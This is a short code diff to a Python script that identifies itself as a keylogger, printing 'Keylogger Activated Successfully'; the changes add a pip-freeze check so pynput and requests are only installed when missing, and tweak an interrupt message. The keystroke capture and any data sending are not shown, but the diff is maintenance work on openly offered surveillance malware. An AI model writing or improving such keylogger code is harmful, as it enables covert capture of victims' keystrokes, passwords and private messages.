@@ -1,5 +1,21 @@
 def main():
-    terminal("pip install pynput==1.7.4")
+    terminal("pip freeze > pip.txt")
+    file = open("pip.txt", "r")
+    pip_file = file.read()
+    file.close()
+    remove("pip.txt")
+
+    pip_list = pip_file.split("\n")
+
+    IsModuleFound = False
+
+    for pip in pip_list:
+        if pip == "pynput==1.7.4":
+            IsModuleFound = True
+            break
+
+    if not IsModuleFound:
+        terminal("pip install pynput==1.7.4")
 
     try:
         # Importing third party library.
@@ -9,7 +25,15 @@ def main():
         if IsAccountActive:
             msg = "Keylogger Activated Successfully...\n\n"
 
-            terminal("pip install requests==2.26.0")
+            IsModuleFound = False
+
+            for pip in pip_list:
+                if pip == "requests==2.26.0":
+                    IsModuleFound = True
+                    break
+
+            if not IsModuleFound:
+                terminal("pip install requests==2.26.0")
 
             try:
                 # Importing third party library.
@@ -352,7 +376,7 @@ try:
         main()
 
 except KeyboardInterrupt:
-    print("[ERROR]\tKeyboardInterrupt occurred! Bye...")
+    print("\n[ERROR]\tKeyboardInterrupt occurred! Bye...")
     info("KeyboardInterrupt occurred...")
 
     if environment() == "Windows":
